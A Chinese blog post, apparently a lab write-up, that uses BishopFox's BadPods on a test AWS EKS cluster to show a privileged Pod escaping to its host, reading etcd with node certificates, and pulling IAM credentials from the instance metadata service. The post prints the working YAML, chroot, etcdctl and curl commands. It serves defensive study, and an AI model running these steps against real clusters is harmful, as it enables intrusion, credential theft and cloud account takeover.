---
title: BadPods 实战：在 AWS EKS 上投放一枚“全权限”炸弹会怎样
url: https://mp.weixin.qq.com/s/LVrgqeHXjMkLTiios3eMVg
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:01:36.942155
---

# BadPods 实战：在 AWS EKS 上投放一枚“全权限”炸弹会怎样

![cover_image](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibeCKmLwbfEiavlWRn18R8YDe4hzxTwqwJjmSibpK6zKT9Vac0mzKjokx55gYibMKlmn4xRbrC6vXaOxOjqBJuRnqycq0YjnOGojX0/0?wx_fmt=png&from=appmsg)

# BadPods 实战：在 AWS EKS 上投放一枚“全权限”炸弹会怎样

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> Kubernetes 的默认配置能有多脆弱？我在 EKS 上模拟了一次“全权限” Pod 攻击。从容器逃逸到宿主机，再到横向平移接管整个集群，最后直取 AWS 云端管理权限。这不是理论推演，而是真实环境下一穿到底的踩坑实录。

## 写在前面：为什么要搞这个测试

最近在死磕 Kubernetes，从 Pod、ReplicaSet 一直啃到调度器，但最上头的还是安全这块。我一直想动手测测 K8s 环境里那些最常见的攻击路径，并记录下来。刚开始列提纲的时候发现水太深了，一个点就能扯出一大片，必须得讲点策略。

Kubernetes 虽然给了很细粒度的 Pod 安全控制，但很多细微的配置失误往往就是致命的。我打算写一个“假设已失陷”的系列：假设攻击者已经拿到了 Pod 里的 RCE 权限，基于这个 Pod 的不同配置，看能对整个系统造成多大的冲击。为了方便测试，我用了 BishopFox 开源的项目 BadPods[1]，它能快速部署一堆配置有问题的 Pod。

这第一篇文，就从最极端的开始：**Bad Pod #1：全权限（Everything Allowed）。**就是把所有危险的开关全部拉满，看看会发生什么。

## 靶场环境

先交代一下实验环境：云平台选了 AWS EKS，Kubernetes 版本 1.34，跑了两台 c7i-flex.large 的 Worker 节点。操作系统是 Amazon Linux 2023，也就是 EKS 现在默认的 AMI。集群的 Pod 安全准入（PSA）策略直接用了默认值。

为了让实验能随时复现，我还专门写了个自动化脚本 easy-k8s-deploy，通过 Github Actions 就能把集群部署起来（适用于 AWS/Azure/GCP 的试用账号）。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcyvAz6MDetRxgPg1zCGR4K1LNr4vN9b9aVlH4B0B2w7wurXlaiceCZHWIrUxpLO1c24caV1icWf6ibOY1gHfnt4XOEsxOQ94Rxbk/640?wx_fmt=png&from=appmsg)

## 拆解那个危险的 YAML

我部署的 Pod 长下面这样。在看攻击效果之前，得先弄明白这几行配置到底意味着什么。

# everything-allowed-exec-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /

这几个参数，每一个都是捅向隔离边界的一刀：

* **privileged: true：**容器直接拿到所有内核能力，原来限制它的安全屏障基本全卸了。
* **hostPath /：**把宿主机的根目录挂载进容器里的 /host，相当于直接把家底全亮给容器看。
* **hostNetwork: true：**让 Pod 直接使用宿主机的网络，包括能直接访问那条要命的元数据服务端点（169.254.169.254）。
* **hostPID / hostIPC: true：**允许 Pod 看到并操作宿主机上的所有进程和跨进程通信。

说白了，这几个配置叠在一起，Kubernetes 里所谓的容器隔离，基本上就是纸糊的墙。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdnUxIqHt6ytCOt99TgscSh0mPM0UVlye23wOBzOib9ONpibS6DA4L4xC1MAeYPm0G9ao2wz9sfktINBzMFDn3ZPTUd75hY5TsVI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibd7z6gPFNfdSib7dwjvibMZRnX9NYVQSUYI1zpibJLickKnD9Ys9tiaJN7nkRTjzKeU8EI2U9DSawDlG3KQMfg24y6uf2HjxeN3Lzkc/640?wx_fmt=png&from=appmsg)

## 威胁模型

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibfn5hLz4edMDoQ6lAJdeG09RR8CrfIuIKtzZ8BQ5Vphgj11uvETia8H56v8ke15ZdKKx3DFrsZ41zdZWrrr660g42O3Wkhgb2oE/640?wx_fmt=png&from=appmsg)

## 第一步：撕开容器，逃逸到宿主机

我们的起点是假设攻击者已经通过某种手段（比如命令注入或反弹 Shell）拿下了 Pod 里的 Shell 权限。由于前面那些危险的配置，从 Pod 里出来简直不费吹灰之力。

先看下当前环境，确认我们在 Ubuntu 容器里：

kubectl exec -it everything-allowed-exec-pod -- /bin/bash
root@ip-172-31-80-238:/# whoami
root
root@ip-172-31-80-238:/# hostname
ip-172-31-80-238.ec2.internal
root@ip-172-31-80-238:/# cat /etc/os-release
PRETTY\_NAME="Ubuntu 24.04.3 LTS"

接着，因为宿主机的根目录就挂载在 /host 下，加上 privileged 权限，一个简单的 chroot 就出去了：

chroot /host /bin/bash
[root@ip-172-31-80-238 /]# whoami
root
[root@ip-172-31-80-238 /]# cat /etc/os-release
NAME="Amazon Linux"

操作系统从 Ubuntu 秒变 Amazon Linux 2023。再看看 /var/lib/kubelet 这种容器里永远不该触及的目录，现在触手可及。这一下，等于通过 root 权限接管了整个宿主机。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibc8icLvCTTLHFO6ic7PGGc9GJ6C3lNCGy01dia7LyiaOmzalumaep22IEHNMsvzW3BjfAoMnedCuHicRHoGrruN7HhoAMFgicymVwNa8/640?wx_fmt=png&from=appmsg)

你可能会注意到主机名没变，那是因为 Pod 开启了 hostNetwork，一早就共享了宿主机的网络名空间。但操作系统的切换、文件系统的变化、以及对 Kubelet 目录的访问，铁证如山：容器边界完全崩溃了。

## 第二步：从单点沦陷到集群失守

既然进了节点，光占个宿主机肯定不够，得试试在集群里横着走。

先部署一个“受害者” Pod 当作靶子。这时候 Pod 里的 hostPID 就派上大用场了，我能直接翻到宿主机进程里的东西。最关键的是找到了 kubelet 的配置文件和静态 Pod 的路径，里面往往藏着签发证书的私钥或者直接连到 Etcd 的凭证。

接着翻 /etc/kubernetes/。如果能找到 Etcd 的客户端证书，就能直捣集群的“数据库”。

ls /etc/kubernetes/pki/etcd/
ca.crt  healthcheck-client.crt  peer.crt  server.crt
# 环境里可能路径不一样，但目的是找到类似 ca.crt, client.crt, client.key 的文件

拿到证书后，直接在受控的节点上用 etcdctl 去查集群里的敏感信息：

etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

此时，查看集群里有哪些命名空间、哪些服务、甚至捞取 ServiceAccount 的 Token，就是敲几行命令的事。横向平移的通道彻底打通。

## 第三步：越过边界，直取云账号

拿到了节点权限还不算完，云上环境最大的风险往往是元数据服务。因为 Pod 设置了 **hostNetwork: true**，它天生就能访问宿主机网络，IP 地址也不是 Pod 网段，而是节点自己的 IP。这意味着只要去请求 169.254.169.254，就能拿到 AWS 的临时凭证。

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

如果节点绑定的 IAM 角色权限过大，那就是灾难。为了演示最大杀伤力，我给这个节点角色绑了个 **AdministratorAccess**。现实里给节点绑管理员权限的人不少，或者即使权限没这么大，哪怕只有 S3 读取或 Lambda 更新权限，也能造成严重的数据泄露或服务中断。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibdaVYsfgIiaMSicnbu1BpHm4gqxPsXibBEGl017YFkqB0WuRgfjgxYTNCBMMwJl9wficIvl73H3sYtGUhBgLZibZdgqAnEjeMP3dskA/640?wx_fmt=png&from=appmsg)

拿到凭证后，一个 aws s3 ls 或者 aws ec2 describe-instances 下去，整个 AWS 账号的资源瞬间裸奔。从容器里的一行代码注入，到云账号失窃，链路就是这么短。

## 写在最后

我们用 Bad Pod #1 完整演示了“容器逃逸 -> 集群控制 -> 云账号接管”这条攻击链。privileged、hostPath、hostNetwork 这几个雷点踩中一个已够呛，全凑齐了基本就是给攻击者开门。

有一点挺让人憋屈的：EKS 的默认 Pod 安全准入策略，就这么眼看着这个“全权限” Pod 跑起来，没做任何拦截。这到底算是配置上的疏忽，还是产品设计上的妥协？

这篇只是这个系列的一个开头。接下来我会把这套配置搬到 Azure AKS 和 Google GKE Autopilot 上去，看看不同的云厂商里，谁扛得住这种折腾，谁是纸糊的。我会慢慢关掉这些危险的开关，再去探索新的攻击路径。

---

### 参考资料

[1] https://github.com/BishopFox/badPods

[2] https://cybersecnerds.com/author/kiran-dawadi/

[3] https://cybersecnerds.com/badpods-series-everything-allowed-on-aws-eks/

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

幻泉之洲

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过